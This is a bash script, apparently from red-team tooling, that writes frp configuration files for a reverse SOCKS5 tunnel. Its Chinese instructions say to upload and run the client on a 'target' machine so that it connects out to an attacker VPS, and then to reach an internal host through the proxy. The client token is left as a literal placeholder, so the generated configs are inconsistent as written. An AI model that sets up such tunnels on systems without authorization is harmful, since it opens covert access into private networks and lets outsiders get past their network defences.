#!/usr/bin/env bash
VPS="${1:?usage: bash frp.sh <VPS> [remote_port]}"
RP="${2:-1080}"
cat > runs/frps.ini <<EOF
[common]
bind_port = 7000
token = rt-$(date +%s)
EOF
cat > runs/frpc.ini <<EOF
[common]
server_addr = $VPS
server_port = 7000
token = rt-<同上>

[socks]
type = tcp
remote_port = $RP
plugin = socks5
plugin_user = rt
plugin_passwd = $(openssl rand -hex 6 2>/dev/null || echo rtpass123)
EOF
echo '1) VPS:  ./frps -c runs/frps.ini'
echo '2) 目标: 上传 frpc + runs/frpc.ini，执行 ./frpc -c frpc.ini'
echo "3) 验证: curl -sS --socks5 rt:<pass>@$VPS:$RP http://10.0.0.5/ -o /dev/null -w '%{http_code}\n'"
echo '注意：token / plugin_passwd 必须两边一致；不要在公网裸开 socks5'
